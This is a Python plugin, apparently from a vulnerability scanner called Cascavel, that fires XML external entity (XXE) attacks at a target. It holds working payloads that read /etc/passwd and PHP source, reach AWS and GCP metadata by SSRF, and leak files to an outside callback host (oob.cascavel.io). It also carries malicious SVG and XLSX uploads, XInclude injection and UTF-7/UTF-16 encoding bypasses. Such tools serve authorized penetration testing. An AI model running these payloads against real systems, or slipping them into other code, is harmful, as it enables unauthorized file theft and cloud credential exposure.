# plugins/xxe_scanner.py — Cascavel 2026 Intelligence
import requests
import base64


ENDPOINTS = [
    "/", "/api/", "/api/v1/", "/upload", "/import", "/parse",
    "/xmlrpc.php", "/soap", "/wsdl", "/feed", "/api/xml",
    "/api/v1/import", "/api/v1/export", "/rss", "/atom",
    "/api/soap", "/ws", "/xmlrpc", "/api/upload",
]

CONTENT_TYPES = [
    "application/xml",
    "text/xml",
    "application/soap+xml",
    "application/xhtml+xml",
    "application/rss+xml",
    "application/atom+xml",
]

XML_PARSER_ERRORS = [
    "xml parsing", "entity", "doctype", "dtd", "xmlparseentity",
    "simplexml_load", "domparser", "saxparser", "lxml", "expat",
    "xerces", "javax.xml", "org.xml.sax", "xmlreader",
]

# ──────────── CLASSIC XXE PAYLOADS ────────────
CLASSIC_PAYLOADS = [
    {
        "nome": "FILE_READ_PASSWD",
        "xml": '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>',
        "indicador": "root:",
    },
    {
        "nome": "FILE_READ_WIN",
        "xml": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><data>&xxe;</data>',
        "indicador": "[fonts]",
    },
    {
        "nome": "SSRF_AWS_METADATA",
        "xml": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><data>&xxe;</data>',
        "indicador": "ami-id",
    },
    {
        "nome": "SSRF_GCP_METADATA",
        "xml": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/project/project-id">]><data>&xxe;</data>',
        "indicador": "",
    },
    {
        "nome": "PHP_FILTER_B64",
        "xml": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><data>&xxe;</data>',
        "indicador": "PD9w",
    },
]

# ──────────── BLIND/OOB XXE PAYLOADS ────────────
BLIND_PAYLOADS = [
    {
        "nome": "BLIND_OOB_HTTP",
        "xml": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://oob.cascavel.io/xxe">%xxe;]><data>test</data>',
    },
    {
        "nome": "BLIND_OOB_DNS",
        "xml": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://xxe.oob.cascavel.io/">%xxe;]><data>test</data>',
    },
    {
        "nome": "BLIND_PARAMETER_ENTITY",
        "xml": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/hostname"><!ENTITY % dtd SYSTEM "http://oob.cascavel.io/dtd">%dtd;%send;]><data>test</data>',
    },
]

# ──────────── XXE IN FILE UPLOADS (SVG, XLSX, DOCX) ────────────
SVG_XXE = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
<text x="0" y="20">&xxe;</text>
</svg>'''

XLSX_XXE_SHARED_STRINGS = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
<si><t>&xxe;</t></si></sst>'''

# ──────────── ENCODING BYPASS ────────────
ENCODING_PAYLOADS = [
    {
        "nome": "UTF7_BYPASS",
        "xml": '+/v8-<?xml version="1.0" encoding="UTF-7"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>',
        "indicador": "root:",
    },
    {
        "nome": "UTF16_BYPASS",
        "xml": '<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>',
        "indicador": "root:",
    },
]

# ──────────── XINCLUDE ────────────
XINCLUDE_PAYLOAD = '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>'


def _test_classic_xxe(target, endpoint):
    """Testa XXE clássico com múltiplos Content-Types."""
    vulns = []
    url = f"http://{target}{endpoint}"

    for payload in CLASSIC_PAYLOADS:
        for ct in CONTENT_TYPES[:3]:
            try:
                resp = requests.post(url, data=payload["xml"], timeout=8,
                                      headers={"Content-Type": ct})
                if resp.status_code == 200:
                    if payload["indicador"] and payload["indicador"] in resp.text:
                        vulns.append({
                            "tipo": "XXE", "subtipo": payload["nome"],
                            "endpoint": endpoint, "content_type": ct,
                            "severidade": "CRITICO",
                            "descricao": f"XXE confirmado via {payload['nome']}!",
                            "amostra": resp.text[:300],
                        })
                        break
                    elif any(kw in resp.text.lower() for kw in XML_PARSER_ERRORS):
                        vulns.append({
                            "tipo": "XXE_PARSER_DETECTED", "subtipo": payload["nome"],
                            "endpoint": endpoint, "severidade": "MEDIO",
                            "descricao": "XML parser detectado — superfície de ataque XXE!",
                        })
            except Exception:
                continue
    return vulns


def _test_blind_xxe(target, endpoint):
    """Testa blind XXE via OOB (HTTP/DNS callback)."""
    vulns = []
    url = f"http://{target}{endpoint}"

    for payload in BLIND_PAYLOADS:
        for ct in CONTENT_TYPES[:2]:
            try:
                resp = requests.post(url, data=payload["xml"], timeout=8,
                                      headers={"Content-Type": ct})
                # Blind XXE não retorna dados — marcar como injetado
                if resp.status_code in (200, 500, 400):
                    vulns.append({
                        "tipo": "XXE_BLIND_INJECTED", "subtipo": payload["nome"],
                        "endpoint": endpoint, "content_type": ct,
                        "severidade": "ALTO",
                        "descricao": f"Blind XXE payload injetado ({payload['nome']}) — verificar OOB callback!",
                    })
                    break
            except Exception:
                continue
    return vulns


def _test_svg_upload(target):
    """Testa XXE via upload de SVG malicioso."""
    vulns = []
    upload_endpoints = ["/upload", "/api/upload", "/api/v1/upload", "/api/avatar", "/api/image"]

    for ep in upload_endpoints:
        url = f"http://{target}{ep}"
        try:
            files = {"file": ("test.svg", SVG_XXE, "image/svg+xml")}
            resp = requests.post(url, files=files, timeout=8)
            if "root:" in resp.text:
                vulns.append({
                    "tipo": "XXE_SVG_UPLOAD", "endpoint": ep,
                    "severidade": "CRITICO",
                    "descricao": "XXE via SVG upload — file read confirmado!",
                })
            elif resp.status_code in (200, 201):
                vulns.append({
                    "tipo": "XXE_SVG_INJECTED", "endpoint": ep,
                    "severidade": "ALTO",
                    "descricao": "SVG XXE payload aceito pelo upload — verificar renderização!",
                })
        except Exception:
            continue
    return vulns


def _test_xlsx_xxe(target):
    """Testa XXE via upload de XLSX com sharedStrings.xml malicioso."""
    vulns = []
    upload_endpoints = ["/upload", "/api/upload", "/api/v1/import", "/import"]

    for ep in upload_endpoints:
        url = f"http://{target}{ep}"
        try:
            # Enviar como XLSX content (seria um ZIP real, mas testamos parsing)
            files = {"file": ("test.xlsx", XLSX_XXE_SHARED_STRINGS.encode(), "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet")}
            resp = requests.post(url, files=files, timeout=8)
            if "root:" in resp.text:
                vulns.append({
                    "tipo": "XXE_XLSX", "endpoint": ep,
                    "severidade": "CRITICO",
                    "descricao": "XXE via XLSX upload (sharedStrings.xml)!",
                })
        except Exception:
            continue
    return vulns


def _test_xinclude(target, endpoint):
    """Testa XInclude injection (quando não se controla DOCTYPE)."""
    url = f"http://{target}{endpoint}"
    try:
        resp = requests.post(url, data=XINCLUDE_PAYLOAD, timeout=6,
                              headers={"Content-Type": "application/xml"})
        if "root:" in resp.text:
            return {
                "tipo": "XINCLUDE_INJECTION", "endpoint": endpoint,
                "severidade": "CRITICO",
                "descricao": "XInclude injection — file read confirmado!",
            }
    except Exception:
        pass
    return None


def _test_encoding_bypass(target, endpoint):
    """Testa XXE com encoding bypass (UTF-7, UTF-16)."""
    vulns = []
    url = f"http://{target}{endpoint}"
    for payload in ENCODING_PAYLOADS:
        try:
            resp = requests.post(url, data=payload["xml"], timeout=8,
                                  headers={"Content-Type": "application/xml"})
            if payload["indicador"] and payload["indicador"] in resp.text:
                vulns.append({
                    "tipo": "XXE_ENCODING_BYPASS", "subtipo": payload["nome"],
                    "endpoint": endpoint, "severidade": "CRITICO",
                    "descricao": f"XXE via {payload['nome']} encoding bypass!",
                })
        except Exception:
            continue
    return vulns


def run(target, ip, open_ports, banners):
    """
    Scanner XXE 2026-Grade — Classic, Blind/OOB, SVG, XLSX, XInclude, Encoding.

    Técnicas: 5 classic payloads (file read/SSRF/PHP filter), 3 blind OOB
    (HTTP/DNS callback + parameter entity), SVG upload XXE, XLSX sharedStrings XXE,
    XInclude injection, encoding bypass (UTF-7/UTF-16), 6 Content-Types testados,
    19 endpoints, upload endpoint scanning.
    CVEs: CVE-2025-58360, CVE-2025-49493.
    """
    _ = (ip, open_ports, banners, base64)
    vulns = []

    for ep in ENDPOINTS:
        # 1. Classic XXE
        vulns.extend(_test_classic_xxe(target, ep))

        # 2. Blind/OOB XXE
        vulns.extend(_test_blind_xxe(target, ep))

        # 3. XInclude
        xi = _test_xinclude(target, ep)
        if xi:
            vulns.append(xi)

        # 4. Encoding bypass
        vulns.extend(_test_encoding_bypass(target, ep))

    # 5. SVG upload XXE
    vulns.extend(_test_svg_upload(target))

    # 6. XLSX upload XXE
    vulns.extend(_test_xlsx_xxe(target))

    return {
        "plugin": "xxe_scanner",
        "versao": "2026.1",
        "tecnicas": ["classic_xxe", "blind_oob", "svg_upload", "xlsx_upload",
                      "xinclude", "encoding_bypass", "content_type_switch"],
        "resultados": vulns if vulns else "Nenhum XXE detectado",
    }
